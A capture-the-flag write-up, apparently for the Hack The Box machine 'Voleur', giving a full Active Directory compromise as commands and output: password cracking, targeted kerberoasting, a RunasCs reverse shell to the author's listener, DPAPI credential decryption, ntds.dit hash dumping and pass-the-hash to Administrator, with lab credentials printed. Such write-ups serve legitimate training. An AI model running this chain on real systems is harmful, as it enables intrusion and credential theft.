<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Voleur - My Cybersec writeups</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "../../../";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "../../../searchindex.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">My Cybersec writeups</h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <i class="fa fa-spinner fa-spin"></i>
                            </div>
                        </div>
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="voleur"><a class="header" href="#voleur">Voleur</a></h1>
<p>ryan.naylor:HollowOct31Nyt</p>
<pre><code class="language-bash">$ nmap 10.10.11.76 --min-rate 3000
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2222/tcp open  EtherNetIP-1
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
</code></pre>
<pre><code class="language-bash">$ nxc smb &lt;machine-ip&gt; -u ryan.naylor -p HollowOct31Nyt
</code></pre>
<pre><code class="language-bash">$ &lt;machine-ip&gt;    voleur.htb dc.voleur.htb dc 
</code></pre>
<pre><code class="language-bash">$ faketime "$(rdate -n dc.voleur.htb -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
</code></pre>
<pre><code class="language-bash">$ getTGT.py -dc-ip "dc.voleur.htb" "voleur.htb"/"ryan.naylor":"HollowOct31Nyt"
</code></pre>
<pre><code class="language-bash">$ export KRB5CCNAME="$(pwd)/ryan.naylor.ccache"
</code></pre>
<pre><code class="language-bash">$ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt --use-kcache
</code></pre>
<pre><code class="language-bash">$ bloodhound.py --zip -c All -d "voleur.htb" -u "ryan.naylor" -p "HollowOct31Nyt" -ns "10.10.11.76" -k -no-pass
</code></pre>
<p><img src="../../../assets/htb/voleur/domain_admin_path.png" alt="Domain admin path" /></p>
<pre><code class="language-bash">$ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt --use-kcache --shares
</code></pre>
<p>Access to the IT share with read privilege</p>
<pre><code class="language-bash">$ smbclient.py dc.voleur.htb -k -no-pass
</code></pre>
<p>Now we have access to a directory <code>First-Line Support</code> which contain the file <code>Access_Review.xlsx</code></p>
<p>We download it locally using</p>
<pre><code class="language-bash">$ get Access_Review.xlsx
</code></pre>
<pre><code class="language-bash">$ libreoffice --calc Access_Review.xlsx
</code></pre>
<p><img src="../../../assets/htb/voleur/tableur_password.png" alt="Asking password Image" /></p>
<pre><code class="language-bash">$ office2john.py Access_Review.xlsx &gt; Access_Review.hash
</code></pre>
<pre><code class="language-bash">$ john --wordlist=rockyou.txt Access_Review.hash
</code></pre>
<p>Access_Review.xlsx:football1</p>
<p><img src="../../../assets/htb/voleur/tableur.png" alt="Tableur" /></p>
<p>svc_ldap:M1XyC9pW7qT5Vn
svc_iis:N5pXyW1VqM7CZ8</p>
<p><img src="../../../assets/htb/voleur/svc_ldap_to_svc_winrm.png" alt="Domain admin path" /></p>
<pre><code class="language-bash">$ bloodyAD --host "dc.voleur.htb" -d "voleur.htb" -u "svc_ldap" -p "M1XyC9pW7qT5Vn" -k set object S-1-5-21-3927696377-1337352550-2781715495-1601 serviceprincipalname -v FAKE/voleur.htb
</code></pre>
<pre><code class="language-bash">$ nxc ldap "dc.voleur.htb" -d "voleur.htb" -u "svc_ldap" -p "M1XyC9pW7qT5Vn" -k --kerberoasting hashes.txt
</code></pre>
<pre><code class="language-bash">$ john --wordlist=rockyou.txt hashes.txt
</code></pre>
<p>svc_winrm:AFireInsidedeOzarctica980219afi</p>
<p>We have to edit the krb5.conf file to use kerberos authentification with evil-winrm.</p>
<p>We will add the following lines:</p>
<pre><code>VOLEUR.HTB = {
    kdc = dc.voleur.htb          
}
</code></pre>
<pre><code class="language-bash">$ getTGT.py -dc-ip "dc.voleur.htb" "voleur.htb"/"svc_winrm":"AFireInsidedeOzarctica980219afi"
</code></pre>
<blockquote>
<p>Again, don't forget to change the KRB5CCNAME environment's variable: export KRB5CCNAME="$(pwd)/svc_winrm.ccache"</p>
</blockquote>
<pre><code class="language-bash">$ evil-winrm -i "dc.voleur.htb" -r VOLEUR.HTB
</code></pre>
<blockquote>
<p>The user.txt is in C:\Users\svc_winrm\Desktop</p>
</blockquote>
<pre><code class="language-powershell">upload /workspace/RunasCs.exe C:\\Users\\svc_winrm\\Desktop\\RunasCs.exe
</code></pre>
<pre><code class="language-bash">$ nc -lvnp 4444
</code></pre>
<pre><code class="language-powershell">./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r &lt;my-ip&gt;:4444
</code></pre>
<pre><code class="language-powershell">Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
</code></pre>
<pre><code class="language-powershell">Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
</code></pre>
<p>todd.wolfe:NightT1meP1dg3on14</p>
<p>todd.wolfe has also access to the IT share. Using the same method as earlier (with rayan.naylor) we will see what it contains.</p>
<p>It appears that the share for todd.wolfe contain a <code>/Second-Line Support/Archived Users/todd.wolfe</code> directory.</p>
<p>It looks like a Windows home directory, and there is an interesting <code>AppData/Roaming</code> directory.</p>
<p>Inside it we can find a credential file in <code>Credential/</code> and the masterkey to decryt it in <code>Protect/S-1-5-21-3927696377-1337352550-2781715495-1110</code></p>
<pre><code># cd Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 14:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# cd ../Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 14:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 13:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 13:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
</code></pre>
<p>We download both files and first we will decrypt the masterkey using the dpapi.py tool:</p>
<pre><code class="language-bash">$ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
</code></pre>
<p>Then we can decrypt the hidden credential, still with dpapi.py:</p>
<pre><code class="language-bash">$ dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83                                    
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
</code></pre>
<p>jeremy.combs:qT3V9pLXyN7W4m</p>
<p>jeremy.combs can also read the IT shared directory. He has access to a <code>Third-Line Support</code> that contains 2 things:</p>
<ul>
<li>Notes.txt: which is a note left by the administrator talking about using linux backup tools by using WSL.</li>
<li>id_rsa: which is probably the private key that we will use to connect to the ssh server opened on WSL.</li>
</ul>
<p>It also contains a <code>Backups/</code> directory that we can't read for now.</p>
<p>But if we try to connect to the ssh server normaly it won't work:</p>
<pre><code class="language-bash">ssh jeremy.combs@voleur.htb -i id_rsa
</code></pre>
<p>That is for 2 reasons.</p>
<p>First if we look closer to the port 2222 that we scanned during our first nmap execution we see that the ssh server is running on it.</p>
<blockquote>
<p>By default the port of the ssh service is 22, we need to change this in our command.</p>
</blockquote>
<pre><code class="language-bash">$ nmap 10.10.11.76 --min-rate 3000 -sV -p 2222

Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 08:25 CET
Nmap scan report for voleur.htb (10.10.11.76)
Host is up (1300s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
</code></pre>
<p>And the second problem is the user that we use to login. We need to use the svc_backup user that we saw earlier in the .xslx file.</p>
<blockquote>
<p>Don't forget to give restricted permission to the private key: <code>chmod 600 id_rsa</code></p>
</blockquote>
<pre><code class="language-bash">$ ssh svc_backup@voleur.htb -i id_rsa -p 2222
</code></pre>
<p>On WSL we can go root very easily knowing that svc_backup can execute any command as root using sudo.</p>
<pre><code class="language-bash">$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
$ sudo su
# whoami
root
</code></pre>
<p>It is useless though, since we want to escalate to root on the Windows machine.</p>
<p>The useful data for that can be found in <code>/mnt/c/IT</code>, we have the same shared directory that we've seen earlier with jeremy.combs.</p>
<p>However now we can read the <code>Backups/</code> directory and this is our key to the root on the Windows machine.</p>
<p>In <code>Backups/</code> we can find the <code>ntds.dit</code> file and the <code>SECURITY</code> and <code>SYSTEM</code> files that allow us to dump all the user on the DC and their passwords.</p>
<pre><code class="language-bash">$ scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
...
$ scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
...
$ scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" .
...
$ secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
</code></pre>
<p>With this we get the Administrator NTLM hash that is dumped.</p>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::</p>
<p>We can ask a TGT ticket for Administrator using the hash found.</p>
<pre><code class="language-bash">$ getTGT.py -dc-ip "dc.voleur.htb" "voleur.htb"/"Administrator" -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
</code></pre>
<p>We just have to use evil-winrm with the obtained ticket and we are now log in as Administrator !</p>
<blockquote>
<p>The root.txt is in C:\Users\Administrator\Desktop</p>
</blockquote>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../htb/machines/easy.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../htb/machines/medium.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../htb/machines/easy.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../htb/machines/medium.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->



    </div>
    </body>
</html>
